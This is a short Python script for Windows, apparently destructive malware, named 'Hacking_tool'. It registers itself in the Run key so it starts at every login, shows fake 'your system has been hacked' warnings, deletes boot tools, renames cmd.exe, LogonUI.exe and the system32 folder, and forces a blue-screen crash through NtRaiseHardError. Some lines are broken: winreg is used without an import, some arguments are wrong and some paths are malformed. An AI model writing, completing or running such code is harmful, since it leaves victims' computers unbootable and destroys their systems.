import os
import time
import ctypes
from win32api import *
from win32con import *
from win32gui import *
from win32ui  import *
from win32file import *
from threading import _start_new_thread as thread
from random import randrange, choice

time = GetSystemTime()

def startup():
    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                             winreg.KEY_SET_VALUE)
    winreg.SetValueEx(reg_key, "Hacking_tool", 0, winreg.REG_SZ, "C:\Users\%USERNAME%\Desktop\Hacking_tool\Hacking_tool.exe")
    winreg.CloseKey(reg_key)

startup()

def BSOD():
    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        MessageBox("?!.", "no", MB_ICONWARNING | MB_OK)

def payload_january():
    MessageBox("Your system has been hacked.Your computer will be shutdown to prevent damage!", "Hacking_tool", MB_ICONWARNING | MB_OK)
    MessageBox("ERROR", "Hold your farts,BSOD coming!", "ERROR", MB_ICONWARNING | MB_OK)
    os.system("del /f /w C:\windows\system32\bcdboot.exe")
    os.system("del /f /w C:\windows\system32\bcdedit.exe")

    os.rename(r'C:\windows\system32\cmd.exe', r'C\windows\system32\batch_haking_tool.hak')
    os.rename(r'C:\windows\system32\LogonUI.exe', r'C\windows\system32.LongGone.Missing')
    os.rename(r'C:\windows\system32', r'C\windows\Cortana666')
    BSOD()











